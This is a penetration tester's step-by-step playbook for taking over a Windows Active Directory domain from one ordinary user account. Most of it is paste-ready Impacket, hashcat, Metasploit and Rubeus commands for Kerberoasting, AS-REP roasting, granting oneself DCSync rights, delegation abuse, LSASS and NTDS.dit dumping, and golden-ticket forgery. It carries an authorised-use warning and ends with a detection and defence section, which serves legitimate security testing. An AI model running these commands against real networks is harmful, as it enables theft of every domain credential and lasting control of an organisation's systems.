# Attacking the Domain Controller — End-to-End

The Domain Controller (DC) holds `NTDS.dit` — every account's password hash, including `krbtgt`. Own the DC (or the replication rights it honours) and you own the domain. This note is the full chain **from one set of domain credentials to full domain compromise**, in four steps, with the commonly used techniques (Kerberoasting, AS-REP roasting, ACL/delegation abuse, DCSync, hashcat, golden tickets). See [AD Attacks Overview](AD%20Attacks%20Overview.md) for the mental model and [Impacket Toolkit](Impacket%20Toolkit.md) for tool setup/naming.

> **Authorized engagements only** — scope, rules of engagement, written permission. Steps 3–4 constitute domain compromise; you usually *report* the path and prove it minimally rather than fully persisting.

**Tooling convention (Linux vs Windows).** This vault runs from a **Linux/Kali attack box** with **Impacket + hashcat**; those lead below. **Metasploit** and **Rubeus/PowerView** (from a Windows foothold) are shown as alternatives. Target = IP for NTLM/PtH, FQDN for Kerberos — see [Target spec](Impacket%20Toolkit.md#target-spec-domainuserpasstarget--ip-or-name).

Set these once so the commands paste cleanly:

```bash
DOMAIN=corp.local ; DC=dc01.corp.local ; DCIP=10.10.10.10
USER=jdoe ; PASS='Winter2026!'
echo "$DCIP $DC $DOMAIN" | sudo tee -a /etc/hosts     # so Kerberos names resolve
```

---

## Step 1 — Foothold & enumeration

You start with **one valid domain account** (low-priv is fine), from a [password spray/capture](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md), phish, or a provided test account. First validate it and map the domain — you attack what you can see.

```bash
# Validate creds + find where this account is already local admin
nxc smb <subnet> -u "$USER" -p "$PASS"                         # (Pwn3d!) = local admin there
nxc ldap "$DC" -u "$USER" -p "$PASS"                           # confirm domain auth

# Graph the domain -> attack paths to Domain Admin / DCSync rights
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DCIP" -c All

# Enumerate the pieces you'll attack next
GetADUsers.py -all "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP"        # users + pwdLastSet/lastLogon
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP"           # kerberoastable accounts (list only)
findDelegation.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP"       # delegation to abuse
nxc ldap "$DC" -u "$USER" -p "$PASS" --asreproast asrep.txt   # AS-REP-able users in one shot
```

```bash
# Metasploit equivalents
use auxiliary/gather/ldap_query          # generic LDAP enumeration
use auxiliary/gather/kerberos_enumusers  # valid-username discovery
```

**Output of Step 1:** a picture of privileged groups, kerberoastable/AS-REP-able accounts, delegation, and BloodHound paths toward replication rights.

---

## Step 2 — Credential access: Kerberoasting & AS-REP roasting → hashcat

Both attacks pull an **offline-crackable hash** from the KDC using only a normal domain account. Service accounts are the prize: often over-privileged and set with weak, non-expiring passwords.

### Kerberoasting (accounts with an SPN)

Request a TGS for each SPN account; its ticket is encrypted with the service account's password → crack offline.

```bash
# Impacket — request and save all roastable hashes
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

```bash
# Metasploit — native module (queries LDAP, requests TGS, stores hashes in the DB)
use auxiliary/gather/kerberoast
#   or the Impacket-backed:  use auxiliary/gather/get_user_spns
```

```powershell
# Rubeus (Windows foothold)
Rubeus.exe kerberoast /outfile:kerb.hashes
```

### AS-REP roasting (accounts with Kerberos pre-auth disabled)

```bash
# Impacket
GetNPUsers.py "$DOMAIN/" -usersfile users.txt -dc-ip "$DCIP" -no-pass -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes   # Windows
```

### hashcat modes you'll use in this chain

| Mode | Hash | From |
| --- | --- | --- |
| `13100` | Kerberos TGS-REP (RC4) | Kerberoasting |
| `18200` | Kerberos AS-REP (RC4) | AS-REP roasting |
| `1000` | NTLM | NTDS.dit / secretsdump (Step 4) |
| `5600` | NetNTLMv2 | Responder/relay capture |

```bash
# Metasploit can drive the crack against hashes already in its DB
use auxiliary/analyze/crack_windows       # runs hashcat, writes plaintext back to the credential
```

**Output of Step 2:** one or more cracked service/user passwords. If a cracked account is privileged (or reused as a local admin), you may already be at Step 4; otherwise use it to open the paths in Step 3.

---

## Step 3 — Escalate to DCSync rights (Domain Admin-equivalent)

DCSync works for any principal holding the replication extended rights **`DS-Replication-Get-Changes`** + **`DS-Replication-Get-Changes-All`** on the domain object. By default that's **Domain Admins / Enterprise Admins / Administrators** — but the rights are delegatable, which is why so many paths lead here. Pick the shortest path BloodHound shows.

**Common paths to replication rights:**

- **Privileged cracked account** — the Step-2 service account is in DA/EA/Administrators/Backup Operators → you're done, go to Step 4.
- **ACL abuse** — `GenericAll`/`WriteDACL`/`Owns` on a high-value object (from BloodHound):

  ```bash
  # Grant yourself DCSync rights (needs WriteDACL on the domain head)
  dacledit.py -action write -rights DCSync -principal "$USER" -target-dn 'DC=corp,DC=local' "$DOMAIN/$USER:$PASS"

  # Or take over a Domain Admin you have ForceChangePassword over
  changepasswd.py "$DOMAIN/victim_da@$DC" -newpass 'N3wP@ss!' -reset
  ```

- **Delegation (S4U)** — constrained/RBCD lets you impersonate a DA to the DC:

  ```bash
  addcomputer.py "$DOMAIN/$USER:$PASS" -computer-name 'EVIL$' -computer-pass 'P@ssw0rd'
  rbcd.py -delegate-from 'EVIL$' -delegate-to "$(hostname -s)\$" -action write "$DOMAIN/$USER:$PASS"
  getST.py -spn "cifs/$DC" -impersonate Administrator "$DOMAIN/EVIL\$:P@ssw0rd"
  ```

- **Coercion + NTLM relay to LDAP** — PetitPotam/PrinterBug forces the DC to authenticate; relay it to LDAP to grant RBCD/DCSync. See [Impacket Toolkit → NTLM relay](Impacket%20Toolkit.md#d-ntlm-relay-escalate-without-cracking).
- **Loot a DA session** — [pass-the-hash](Lateral%20Movement%20%26%20Credential%20Access.md) to a server where a DA is logged on, then dump LSASS (`secretsdump.py`, or Meterpreter `load kiwi; creds_all`) to recover the DA's hash.

```bash
# Metasploit helpers on a host session
use incognito ; list_tokens -u ; impersonate_token "CORP\\Administrator"   # token theft
load kiwi ; creds_all ; lsa_dump_secrets                                   # LSASS/LSA secrets
```

**Output of Step 3:** credentials, an NT hash, or a Kerberos ticket for an account with replication rights.

---

## Step 4 — Domain compromise: DCSync, NTDS dump, hashcat, persistence

### DCSync — pull hashes without touching the DC's disk

DCSync asks the DC to *replicate* an account's secrets over DRSUAPI. **No shell or file access on the DC is required** — this is the quiet, preferred path.

```bash
# Impacket (preferred here) — targeted, then the whole directory
secretsdump.py "$DOMAIN/$USER:$PASS"@"$DC" -just-dc-user krbtgt          # krbtgt -> golden-ticket material
secretsdump.py "$DOMAIN/$USER:$PASS"@"$DC" -just-dc                       # every domain hash (full compromise)
secretsdump.py -hashes :<nt-hash> "$DOMAIN/$USER"@"$DC" -just-dc         # pass-the-hash variant
secretsdump.py -k -no-pass "$DOMAIN/$USER"@"$DC" -just-dc -dc-ip "$DCIP" # Kerberos variant
```

**Can I DCSync with Metasploit once I have creds? Yes — two ways:**

```text
# 1) Meterpreter + Kiwi (from a host session in a Domain Admin context)
meterpreter > load kiwi
meterpreter > dcsync CORP\krbtgt            # full account info via DCSync
meterpreter > dcsync_ntlm CORP\Administrator # just the NTLM/LM hash, SID, RID
#   Caveat: run under the DA *user* token, not SYSTEM, and not from the DC itself
#   (SYSTEM-context DCSync is blocked — Metasploit issue #14390). Use incognito to
#   impersonate the DA token first if your session is SYSTEM.

# 2) Remote, creds-only, no session needed (wraps Impacket secretsdump)
msf > use auxiliary/scanner/smb/impacket/secretsdump
msf > set RHOSTS 10.10.10.10        # the DC
msf > set SMBDomain corp.local
msf > set SMBUser jdoe
msf > set SMBPass 'Winter2026!'     # or set NTHASH for pass-the-hash
msf > set ACTION ALL               # dumps SAM/LSA + DOMAIN (DCSync) — or use just-dc behavior
msf > run
```

### Alternative: grab the whole NTDS.dit from the DC

Use when you have code exec/admin **on the DC** rather than just replication rights.

```powershell
# On the DC — create an Install-From-Media copy (ntds.dit + SYSTEM hive)
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
```

```bash
# Then parse the looted hives offline on your box
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

`nxc smb "$DC" -u "$USER" -p "$PASS" --ntds` and a VSS snapshot copy of `\Windows\NTDS\ntds.dit` are equivalent routes.

### Crack (or just reuse) the dumped hashes

```bash
# NTDS output is user:rid:lm:nt::: — crack the NT hashes
cut -d: -f4 ntds.dump | sort -u > nt.hashes
hashcat -m 1000 nt.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Cracking is optional — a dumped NT hash is enough to authenticate via [pass-the-hash](Lateral%20Movement%20%26%20Credential%20Access.md).

### Domain persistence / dominance (report — don't deploy without scope)

With `krbtgt`'s hash you can forge a **golden ticket** (any user, any group, ~10-year lifetime):

```bash
# Impacket
ticketer.py -nthash <krbtgt-nt-hash> -domain-sid <domain-sid> -domain "$DOMAIN" Administrator
```

```powershell
Rubeus.exe golden /rc4:<krbtgt-hash> /sid:<domain-sid> /user:Administrator /ptt   # Windows
```

```text
# Metasploit Kerberos suite
use auxiliary/admin/kerberos/forge_ticket      # GOLDEN (or SILVER with a service hash)
use auxiliary/admin/kerberos/ticket_converter  # kirbi <-> ccache
use auxiliary/admin/kerberos/inspect_ticket    # verify a forged/looted ticket
```

Also note but rarely deploy on a client: **DCShadow**, **AdminSDHolder**, **DSRM admin**, **Skeleton Key**. Prove impact minimally, document, and stop.

---

## Detection & defense (write this in the report)

- **DCSync / replication:** alert on `DS-Replication-Get-Changes` (event **4662** with the replication GUIDs) from accounts that aren't DCs; restrict who holds the right; review domain-object DACLs.
- **Kerberoasting / AS-REP:** **4769** RC4 (`0x17`) spikes and **4768** with pre-auth disabled; use **gMSA**, enforce **AES**, disable RC4, long random service passwords, and set SPNs only where needed.
- **NTDS / LSASS theft:** **Credential Guard**, **Protected Users**, tiered admin model, **LAPS**, and no Domain Admin logons on workstations/servers.
- **Coercion + relay:** enforce **SMB signing** and **LDAP channel binding/signing**, disable NTLM where possible, patch **PetitPotam/PrinterBug**.
- **Golden ticket:** rotate the **`krbtgt`** password **twice**; alert on TGTs with abnormal lifetimes; Protected Users blocks RC4 tickets.
- **Lateral movement to the DC:** monitor service creation (**7045**), **4624** type 3/10 logons, and WinRM/WMI/Task-Scheduler traces.

## References

- Chain pieces in depth: [Enumeration](Enumeration.md), [Kerberos Attacks](Kerberos%20Attacks.md), [Lateral Movement & Credential Access](Lateral%20Movement%20%26%20Credential%20Access.md), [Impacket Toolkit](Impacket%20Toolkit.md), [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md).
- SANS SEC560 handouts in [GPEN Cheatsheet](../GPEN%20Cheatsheet/README.md); The Hacker Recipes, HackTricks AD, BloodHound docs, and the Metasploit Active Directory / Kerberos documentation.
